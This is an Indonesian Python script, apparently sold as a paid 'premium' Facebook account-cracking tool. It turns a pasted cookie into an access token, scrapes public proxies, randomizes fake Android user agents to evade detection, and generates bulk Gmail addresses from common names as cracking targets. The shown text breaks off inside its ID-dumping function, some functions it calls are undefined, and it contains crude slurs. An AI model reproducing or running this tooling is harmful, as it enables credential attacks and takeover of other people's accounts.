#SCRIPT NEW BANGICALL
#PREMIUM SCRIPT 
#25K 1 MINGGU
#45K 2 MINGGU
#65K 1 BULAN
#<----------[ MODULE ]---------->#
import requests,json,os,sys,random,datetime,time,re,platform,bs4,rich,stdiomask
import json, requests ,uuid,random
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as coy
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich import print as cetak

#------[DATA SOUND/MODULE]------#
os.system("pkg install espeak")
os.system('clear')
time.sleep(2)
os.system('espeak -a 300 " CHECK!!"')
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mCHECK!!')
time.sleep(2)
os.system('espeak -a 300 " WELCOME"')
print('\033[97;1m[\x1b[38;5;50m+\033[97;1m] \x1b[38;5;50mWELCOME')
time.sleep(2)
os.system('clear')
#<----------[ MEMEK ]---------->#
id,id1,idf,idf1 = [],[],[],[]
kentod,kentid = [],[]
loop,ok,cp = 0,0,0
pwkon, pwnya = [],[]
tokenmek = []
sall,sall2 = [],[]
ses = requests.Session()
rr = random.randint
rc = random.choice
#<----------[ USER AGENT ]---------->#
def Ical():
	try:
		with open(".useragent.txt","r") as f:
			return f.read().splitlines()
		for ub in ua:
			ua.append(ub)
	except :
		ugent = "Mozilla/5.0 (Linux; Android 10; SM-N971U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36"
	
	rr = random.randint
	rc = random.choice
	ujung = random.choice(["011","016","001","012","013","003","015"])
	build = random.choice(["SP1A","SKQ1","RP1A","PPR1","SP2A","TP1A","UP1A"])
	android = random.choice(["4.0.1","4.0.2","4.1.2","4.2.1","4.4.2","4.4.4","5.1.2","3","4","5","6","7","8","9","10","11","12","13","14","8.0.2"])
	sm = random.choice(["SM-J100Y","SM-J105Y","SM-J111F","SM-G531H","SMN900V 4G","SM-P901","SM-N915F","SM-J200G","SM-A310F","SM-J120H","SM-T280","SM-A800F","SM-J500FN","SM-J105H","SM-J105B","SM-Z200Y","SM-J120F","SM-T360","SM-T331","SM-T530","SM-J320","SM-J700F","SM-J700H","SM-A510F","SM-T585","SM-T550","SM-G318H","SM-G925F","SM-T350","SM-T330NU","SM-T537A","SM-T670","SM-G925F","SM-S920L","SM-G530T1","SM-G530AZ","SM-T535","SM-J700F","SM-T805Y","SM-T531","SM-T285","SM-T550","SM-G928T","SM-T350","SM-T810","SM-G920A","SM-A500FU","SM-A300H","SM-N910G","SM-T555","SM-T815Y","SM-N915FY","SM-G920P","SHV-E330S","SM-N920P","SM-G361H","SM-N920G","SM-G530T","SM-G925F","SM-G925P","SM-A500M","SM-N915A","SM-N915F","SM-G920A","SM-A500H","SM-G925L","SM-J100H","SM-G928T","SM-G925K","SM-G920I","SM-E500H","SM-N920V 4G","SM-N920C","SM-J110F","SM-T337A","SM-G925T","SM-G900F","SM-T800","SM-N900V 4G","GT-I9515","SM-T530NU","SM-T530","GT-I950","SM-T350","SM-G360T1","SM-A800F","SM-T805","SM-T535","SM-T237P","SM-G900I","SM-G928F","SM-T900","SM-G850F","SM-G925F","SM-T817T","SM-T355Y","SM-T335","SM-G890A","SM-J500FN","SM-T530NU","SM-J210Y","SM-E203Y","SM-T87V","SM-D738P","SM-W748D","SM-Z794M","SM-K144T","SM-L372N","SM-B588T","SM-R584V","SM-R108Z","SM-G920F|NRD90M","SM-T535|LRX22G","SM-T231|KOT49H","SM-J320F|LMY47V","GT-I9190|KOT49H","GT-N7100|KOT49H","SM-T561|KTU84P","GT-N7100|KOT49H","GT-I9500|LRX22C","SM-J320F|LMY47V","SM-G930F|NRD90M","SM-J320F|LMY47V","SM-J510FN|NMF26X","GT-P5100|IML74K","SM-J320F|LMY47V","GT-N8000|JZO54K","SM-T531|LRX22G","SPH-L720|KOT49H","GT-I9500|JDQ39","SM-G935F|NRD90M","SM-T561|KTU84P","SM-T531|KOT49H","SM-J320FN|LMY47V","SM-A500F|MMB29M","SM-A500FU|MMB29M","SM-A500F|MMB29M","SM-T311|KOT49H","SM-T531|LRX22G","SM-J320F|LMY47V","SM-J320FN|LMY47V","SM-J320F|LMY47V","GT-P5210|KOT49H","SM-T230|KOT49H","GT-I9192|KOT49H","SM-T235|KOT4","GT-N7100|KOT49H","SM-A500F|LRX22G","SM-A500F|MMB29M","GT-N7100|KOT49H","SM-G920F|MMB29K","SM-J510FN|NMF26X","GT-N8000|JZO54K","SM-J320FN|LMY47V","SM-J320FN|LMY47V","SM-A500H|MMB29M","GT-I9300|JSS15J","GT-I9500|LRX22C","SM-J320F|LMY4","SM-J510FN|NMF26X","SM-A500F|MMB29M","GT-N8000|KOT49H","SM-T561|KTU84P","SM-G900F|KOT49H","GT-S7390|JZO54K","SM-J320F|LMY47V","GT-P5100|JZO54K","SM-A500FU|MMB29M","SM-G930F|NRD90M","SM-J510FN|NMF26X","SM-T561|KTU84P","GT-N8000|KOT49H","SM-T531|LRX22G","SM-J510FN|MMB29M","SM-J510FN|NMF26X","SM-J320F|LMY47V","GT-P5110|JDQ39","GT-I9301I|KOT49H","SM-A500F|LRX22G","SM-G930F|NRD90M","SM-T311|KOT4","GT-P5200|KOT49H","GT-I9301I|KOT49H","SM-J320M|LMY47V","SM-T531|LRX22G","SM-T820|NRD90M","GT-I9192|KOT49H","SM-G935F|MMB29K","SM-J701F|NRD90M;","GT-I9301I|KOT4","SM-J320FN|LMY47V","SM-T111|JDQ39","SM-A500F|MMB29M","SM-J510FN|NMF2","SM-T705|LRX22G","SM-G920F|NRD90M","GT-N5100|JZO54K","GT-I9300I|KTU84P","GT-I9300I|KTU84P","GT-N8000|KOT49H","GT-N8000|KOT49H","SM-A500F|MMB29M","GT-I9190|KOT49H","SM-J510FN|NMF26X","SM-J320F|LMY47V","GT-P5100|JDQ39","GT-I9300I|KTU84P","GT-N5100|JZO54K","GT-N8000|KOT49H","GT-I9500|LRX22C","SM-J320FN|LMY47V","SM-A500F|MMB29M","GT-N8000|JZO54K","SM-T805|LRX22G","SM-T231|KOT49H","GT-N5100|JZO54K","SM-J320H|LMY47V","SM-T231|KOT49H","SM-G930F|NRD90M","SM-G935F|NRD90M","SM-T310|KOT49H","GT-N8000|KOT49H","GT-I9300I|KTU84P","SM-G920F|NRD90M","SM-J510FN|NMF26X","SM-T705|LRX22G;","GT-P3110|JZO54K","GT-I9192|KOT49H","SM-J320F|LMY47V","SM-G920F|NRD90M","GT-I9300|IMM76D","SM-G950F|NRD90M","SM-J320F|LMY47V","SM-J510FN|NMF26X;","SM-J701F|NRD90M","SM-A500F|LRX22G","SM-T231|KOT49H","SM-T311|KOT49H","SM-J320FN|LMY47V","GT-P5210|KOT49H","SM-T805|LRX22G","GT-I9500|LRX22C","GT-P5200|KOT49H","GT-I9301I|KOT49H","GT-I9300|JSS15J","GT-N7100|KOT49H","SM-T531|LRX22G","SM-T820|NRD90M","SM-T315|JDQ39","SM-J320F|LMY47V","GT-I9190|KOT49H","GT-P5220|JDQ39","SM-T525|KOT49H","SM-T555|LRX22G","GT-I9190|KOT49H","SM-J510FN|NMF26X;","SM-A500F|MMB29M","GT-I9192|KOT49H","GT-P5100|JDQ","SM-T311|KOT49H"])
	rm = random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	op = opp = random.choice(["CPH1869","CPH1929","CPH2107","CPH2238","CPH2389","CPH2401","CPH2407","CPH2413","CPH2415","CPH2417","CPH2419","CPH2455","CPH2459","CPH2461","CPH2471","CPH2473","CPH2477","CPH8893","CPH2321","CPH2341","CPH2373","CPH2083","CPH2071","CPH2077","CPH2185","CPH2179","CPH2269","CPH2421","CPH2349","CPH2271","CPH1923","CPH1925","CPH1837","CPH2015","CPH2073","CPH2081","CPH2029","CPH2031","CPH2137","CPH1605","CPH1803","CPH1853","CPH1805","CPH1809","CPH1851","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH2061","CPH2069","CPH2127","CPH2131","CPH2139","CPH2135","CPH2239","CPH2195","CPH2273","CPH2325","CPH2309","CPH1701","CPH2387","CPH1909","CPH1920","CPH1912","CPH1901","CPH1903","CPH1905","CPH1717","CPH1801","CPH2067","CPH2099","CPH2161","CPH2219","CPH2197","CPH2263","CPH2375","CPH2339","CPH1715","CPH2385","CPH1729","CPH1827","CPH1938","CPH1937","CPH1939","CPH1941","CPH2001","CPH2021","CPH2059","CPH2121","CPH2123","CPH2203","CPH2333","CPH2365","CPH1913","CPH1911","CPH1915","CPH1969","CPH2209","CPH1987","CPH2095","CPH2119","CPH2285","CPH2213","CPH2223","CPH2363","CPH1609","CPH1613","CPH1723","CPH1727","CPH1725","CPH1819","CPH1821","CPH1825","CPH1881","CPH1823","CPH1871","CPH1875","CPH2023","CPH2005","CPH2025","CPH2207","CPH2173","CPH2307","CPH2305","CPH2337","CPH1955","CPH1707","CPH1719","CPH1721","CPH1835","CPH1831","CPH1833","CPH1879","CPH1893","CPH1877","CPH1607","CPH1611","CPH1917","CPH1919","CPH1907","CPH1989","CPH1945","CPH1951","CPH2043","CPH2035","CPH2037","CPH2036","CPH2009","CPH2013","CPH2113","CPH2091","CPH2125","CPH2109","CPH2089","CPH2065","CPH2159","CPH2145","CPH2205","CPH2201","CPH2199","CPH2217","CPH1921","CPH2211","CPH2235","CPH2251","CPH2249","CPH2247","CPH2237","CPH2371","CPH2293","CPH2353","CPH2343","CPH2359","CPH2357","CPH2457","CPH1983","CPH1979","CPH2135","CPH1869","CPH1929","CPH2107","CPH2238","CPH2389","CPH2401","CPH2407","CPH2413","CPH2415","CPH2417","CPH2419","CPH2455","CPH2459","CPH2461","CPH2471","CPH2473","CPH2477","CPH8893","CPH2321","CPH2341","CPH2373","CPH2083","CPH2071","CPH2077","CPH2185","CPH2179","CPH2269","CPH2421","CPH2349","CPH2271","CPH1923","CPH1925","CPH1837","CPH2015","CPH2073","CPH2081","CPH2029","CPH2031","CPH2137","CPH1605","CPH1803","CPH1853","CPH1805","CPH1809","CPH1851","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH2061","CPH2069","CPH2127","CPH2131","CPH2139","CPH2135","CPH2239","CPH2195","CPH2273","CPH2325","CPH2309","CPH1701","CPH2387","CPH1909","CPH1920","CPH1912","CPH1901","CPH1903","CPH1905","CPH1717","CPH1801","CPH2067","CPH2099","CPH2161","CPH2219","CPH2197","CPH2263","CPH2375","CPH2339","CPH1715","CPH2385","CPH1729","CPH1827","CPH1938","CPH1937","CPH1939","CPH1941","CPH2001","CPH2021","CPH2059","CPH2121","CPH2123","CPH2203","CPH2333","CPH2365","CPH1913","CPH1911","CPH1915","CPH1969","CPH2209","CPH1987","CPH2095","CPH2119","CPH2285","CPH2213","CPH2223","CPH2363","CPH1609","CPH1613","CPH1723","CPH1727","CPH1725","CPH1819","CPH1821","CPH1825","CPH1881","CPH1823","CPH1871","CPH1875","CPH2023","CPH2005","CPH2025","CPH2207","CPH2173","CPH2307","CPH2305","CPH2337","CPH1955","CPH1707","CPH1719","CPH1721","CPH1835","CPH1831","CPH1833","CPH1879","CPH1893","CPH1877","CPH1607","CPH1611","CPH1917","CPH1919","CPH1907","CPH1989","CPH1945","CPH1951","CPH2043","CPH2035","CPH2037","CPH2036","CPH2009","CPH2013","CPH2113","CPH2091","CPH2125","CPH2109","CPH2089","CPH2065","CPH2159","CPH2145","CPH2205","CPH2201","CPH2199","CPH2217","CPH1921","CPH2211","CPH2235","CPH2251","CPH2249","CPH2247","CPH2237","CPH2371","CPH2293","CPH2353","CPH2343","CPH2359","CPH2357","CPH2457","CPH1983","CPH1979"])
	gt = random.choice(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-g900f","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268","GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-i8700","GT-I8750","GT-I900","GT-I9008L","GT-i9040","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-m190","GT-M5650","GT-mini","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5200","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","GT-P7500R","GT-P7500V","GT-P7501","GT-P7511","GT-S3330","GT-S3332","GT-S3333","GT-S3370","GT-S3518","GT-S3570","GT-S3600i","GT-S3650","GT-S3653W","GT-S3770K","GT-S3770M","GT-S3800W","GT-S3802","GT-S3850","GT-S5220","GT-S5220R","GT-S5222","GT-S5230","GT-S5230W","GT-S5233T","GT-s5233w","GT-S5250","GT-S5253","GT-s5260","GT-S5280","GT-S5282","GT-S5283B","GT-S5292","GT-S5300","GT-S5300L","GT-S5301","GT-S5301B","GT-S5301L","GT-S5302","GT-S5302B","GT-S5303","GT-S5303B","GT-S5310","GT-S5310B","GT-S5310C","GT-S5310E","GT-S5310G","GT-S5310I","GT-S5310L","GT-S5310M","GT-S5310N","GT-S5312","GT-S5312B","GT-S5312C","GT-S5312L","GT-S5330","GT-S5360","GT-S5360B","GT-S5360L","GT-S5360T","GT-S5363","GT-S5367","GT-S5369","GT-S5380","GT-S5380D","GT-S5500","GT-S5560","GT-S5560i","GT-S5570B","GT-S5570I","GT-S5570L","GT-S5578","GT-S5600","GT-S5603","GT-S5610","GT-S5610K","GT-S5611","GT-S5620","G-S5670","GT-S5670B","GT-S5670HKBZTA","GT-S5690","GT-S5690R","GT-S5830","GT-S5830D","GT-S5830G","GT-S5830i","GT-S5830L","GT-S5830M","GT-S5830T","GT-S5830V","GT-S5831i","GT-S5838","GT-S5839i","GT-S6010","GT-S6010BBABTU","GT-S6012","GT-S6012B","GT-S6102","GT-S6102B","GT-S6293T","GT-S6310B","GT-S6310ZWAMID","GT-S6312","GT-S6313T","GT-S6352","GT-S6500","GT-S6500D","GT-S6500L","GT-S6790","GT-S6790L","GT-S6790N","GT-S6792L","GT-S6800","GT-S6800HKAXFA","GT-S6802","GT-S6810","GT-S6810B","GT-S6810E","GT-S6810L","GT-S6810M","GT-S6810MBASER","GT-S6810P","GT-S6812","GT-S6812B","GT-S6812C","GT-S6812i","GT-S6818","GT-S6818V","GT-S7230E","GT-S7233E","GT-S7250D","GT-S7262","GT-S7270","GT-S7270L","GT-S7272","GT-S7272C","GT-S7273T","GT-S7278","GT-S7278U","GT-S7390","GT-S7390G","GT-S7390L","GT-S7392","GT-S7392L","GT-S7500","GT-S7500ABABTU","GT-S7500ABADBT","GT-S7500ABTTLP","GT-S7500CWADBT","GT-S7500L","GT-S7500T","GT-S7560","GT-S7560M","GT-S7562","GT-S7562C","GT-S7562i","GT-S7562L","GT-S7566","GT-S7568","GT-S7568I","GT-S7572","GT-S7580E","GT-S7583T","GT-S758X","GT-S7592","GT-S7710","GT-S7710L","GT-S7898","GT-S7898I","GT-S8500","GT-S8530","GT-S8600","GT-STB919","GT-T140","GT-T150","GT-V8a","GT-V8i","GT-VC818","GT-VM919S","GT-W131","GT-W153","GT-X831","GT-X853","GT-X870","GT-X890","GT-Y8750","GT-I9300","TECNO CD8","itel L6005","itel L6501","TECNO KE7","TECNO IN2","TECNO CD6j","TECNO BD2p","TECNO KD7h","TECNO LA7","itel W6004","MobiGo2","TECNO LC6","TECNO KB7j","itel S661W","TB300FU","S96GT","ZTE A2023G","OPPO A79kt","TECNO CI7n","MP1718","V2154A","SAMSUNG SM-M346B","itel S663L","CHL-AL00","vivo Z3x","CHL-AL00","ivvi P60(i8)"])
	gas = random.choice([
	f"Mozilla/5.0 (Linux; Android {android}; BANGICALL {sm} Build/{build}.{str(rr(210000,650000))}.{ujung}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,450))}.{str(rr(1,450))} Chrome/{str(rr(75,455))}.{str(rr(0,450))}.{str(rr(2500,8500))}.{str(rr(75,455))} Mobile Safari/537.36",
	f"Mozilla/5.0 (Linux; Android {android}; BANGICALL {rm} Build/{build}.{str(rr(210000,650000))}.{ujung}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,450))}.{str(rr(1,450))} Chrome/{str(rr(75,455))}.{str(rr(0,450))}.{str(rr(2500,8500))}.{str(rr(75,455))} Mobile Safari/537.36",
	f"Mozilla/5.0 (Linux; Android {android}; BANGICALL {op} Build/{build}.{str(rr(210000,650000))}.{ujung}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,450))}.{str(rr(1,450))} Chrome/{str(rr(75,455))}.{str(rr(0,450))}.{str(rr(2500,8500))}.{str(rr(75,455))} Mobile Safari/537.36",
	f"Mozilla/5.0 (Linux; Android {android}; BANGICALL {gt} Build/{build}.{str(rr(210000,650000))}.{ujung}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{str(rr(1,450))}.{str(rr(1,450))} Chrome/{str(rr(75,455))}.{str(rr(0,450))}.{str(rr(2500,8500))}.{str(rr(75,455))} Mobile Safari/537.36"
	])
	return gas
#<----------[ WARNA ]---------->#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
mahal = random.choice([P,M,K,H,B,U])
#<----------[ BULAN ]---------->#
rb = {'1':'JANUARI','2':'FEBRUARI','3':'MARET','4':'APRIL','5':'MEI','6':'JUNI','7':'JULI','8':'AGUSTUS','9':'SEPTEMBER','10':'OKTOBER','11':'NOVEMBER','12':'DESEMBER'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
oke = 'SALL-LIVE-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cpe = 'SALL-CHECK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
#<----------[ UCAPAN MANIS ]---------->#
hour = datetime.datetime.now().hour
if 19 <= hour < 4:
  sall2 = f"SELAMAT MALAM"
elif 4 <= hour < 12:
  sall2 = f"SELAMAT PAGI"
elif 12 <= hour < 15:
  sall2 = "SELAMAT SIANG"
elif 15 <= hour < 18:
  sall2 = f"SELAMAT SORE"
elif 18 <= hour < 19:
  sall2 = f"SELAMAT MALAM"
else:
  sall2 = f"SELAMAT MALAM"  
#-----[ Generator-Proksi ]-----#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mTIDAK ADA KONEKSI INTERNET !')
prox=open('.prox.txt','r').read().splitlines()
#<----------[ ANIMASI ]---------->#
def sall(berjalan):
        for gasle in berjalan + "\n":sys.stdout.write(gasle);sys.stdout.flush();time.sleep(0.05)
def sall(berjalan):
        for gasle in berjalan + "\n":sys.stdout.write(gasle);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	menu(id)
#<----------[ BANNER ]---------->#
def SallLOGo():
	os.system('clear')
	cetak(panel(f'''[red]
[red] _______ _______ ___ _______ _______ ___     
[red]|   _   |   _   |   |   _   |   _   |   |    
[red]|.  1___|.  1   |.  |   1___|.  1   |.  |    
[red]|.  __) |.  _   |.  |____   |.  _   |.  |___ 
[red]|:  |   |:  |   |:  |:  1   |:  |   |:  1   |
[red]|::.|   |::.|:. |::.|::.. . |::.|:. |::.. . |
[red]`---'   `--- ---`---`-------`--- ---`-------'    
[blue]STATUS  : PREMIUM 
[blue]VERSION : V2                      ''',width=68,title=f"[[green] BANGICALL [/]]",padding=(0,2),style=f"bold green"))
# --------------------[ MASUK PELAN PELAN ATUH FENDI ]--------------#
def login123():
    os.system("clear")
    banner()
    Console().print(
        Panel(
            f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n[{color_text}02{P2}].{M2}Keluar Tools""",
            width=60,
            style=f"{color_panel}",
            title="[bold green]Login",
        )
    )
    bryn = console.input(f" {H2}• {P2}pilih menu : ")
    if bryn in ["1", "01"]:
        logincoki()
    elif bryn in ["2", "02"]:
        exit()
    else:
        Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end="\r")
        time.sleep(5)
        login()


def login():
    try:
        token = open(".sallok.txt", "r").read()
        cok = open(".salltod.txt", "r").read()
        tokenku.append(token)
        try:
            menu()
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            Console().print(
                f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again"
            )
            exit()
    except IOError:
        login123()
#<--------------[ DEF-LOGIN ]-------------->#
def login_sal():
	try:
		cok = Console().input(f" {H2}• {P2}cookie : ")
		open('.salltod.txt','w').write(cok)
		with requests.Session() as r:
			try:
				r.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate',})
				response = r.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cok})
				if  '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open('.sallok.txt','w').write(token)
					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
				else:Console().print(f" {H2}• {P2}[bold red]Cookie Invalid");exit()
			except Exception as e:print(e);exit()
		Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
		sleep(2);exit()
	except Exception as e:os.system('rm -rf .salltod.txt');os.system('rm -rf .sallok.txt');print(e);exit()
#<----------[ DEF-MENU ]---------->#
def menu(id):
	try:
		token = open('.sallok.txt','r').read()
		cok = open('.salltod.txt','r').read()
	except IOError:
		sal(f' TUMBAL LU MOKAD MEK ')
		waktu(2)
		login_sal()
	os.system('clear')
	SallLOGo()
	cetak(panel(f'[white]01.[blue]CRACK PUBLIK \n[white]02.[blue]CRACK EMAIL \n[white]03.[blue]CRACK FILE \n[white]00.[blue]EXIT',width=68,title=f"[[green] BANGICALL [/]]",padding=(0,2),style=f"bold purple"))
	SALL = input(f' PILIH : ')
	cetak(panel(f'[blue]MASUKAN ID/EMAIL PUBLIK JANGAN PRIVASI',width=68,title=f"[[green] BANGICALL [/]]",padding=(0,2),style=f"bold purple"))
	if SALL in ['1','1']:
		idf = input(f' ID : ')
		dump(idf,"",{"cookie":cok},token)
		print('')
		Sall_setting()
	elif SALL in ['2','02']:
		crack_email()
	elif SALL in ['3','03']:
		Crack_file()
	elif SALL in ['exit','0','logout']:
		hapus_prawan = os.system('rm -rf .sallok.txt && rm -f .salltod.txt')
		sall(f' SUKSES JEBOL PERAWAN')
		time.sleep(5)
		login_sal()
	else:
		sall(f" MASUKAN HANYA ANGKA COK")
		waktu(2)
		back()
		
#------[CRACK-GMAIL]-----#
def crack_email():
	entot = ['free','fire','freefire','epep','akun','gaming','kumala','kumalasari','ramadhan','ramadhani','astuti','sari','ningsih','siregar','muhamad','muhammad','permata','utama','utami','ruslan','yani','utomo','hanafi','marzuki','pratama','permatasari','lestari','puspa','latifah','din','gunawan','irawan','syah','herawan','herawati','wati','dermawan','wan','adijaya','jaya','novita','setiawan','setiawati','setyawati','saputra','putra','putri','pitri','teguh','ghozali','afandi','sihab','rizky','agustin','rahma','rahmawati','efendi','wijaya','maharani','pratiwi','sukma','handayani','sasmita','pramita','priyanka','mahendra','kartika','anggraini','tari','simanjuntak','safitri','saputri','saputra']
	global ok,cp
	nama_target = input(f' TARGET : ')
	if nama_target =='': print('  isi yang benar !');time.sleep(2);os.system('clear');Email()
	for nama in nama_target.split(','):
		doma = '@gmail.com'
		jumlah = input(f' MAU BRAPA EMAIL (MAX:99999) : ')
		for xyz in range(int(jumlah)):
			AA = nama
			BB = [
			f'{str(random.randint(20,9999))}',
			f'{str(random.choice(entot))}',
			f'{str(random.choice(entot))}{str(random.randint(20,9999))}'
			]
			CC = doma
			DD = f'{AA}{str(random.choice(BB))}{CC}'
			if DD in id:pass
			else:id.append(DD+'|'+nama)
			sys.stdout.write(f"\r MENGUMPULKAN {len(id)} EMAIL ")
		Sall_setting()
		
#------[LOGIN2]-----#
def Crack_file():
	file = input(f" MASUKAN NAMA FOLDER : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r SEDANG MENGUMPULKAN ID DWRI {len(id)} FILE...."),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:exit(f" FILE TIDAK ADA")
	Sall_setting()
#<----------[ DEF-PUBLIK ]---------->#
def dump(idf,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
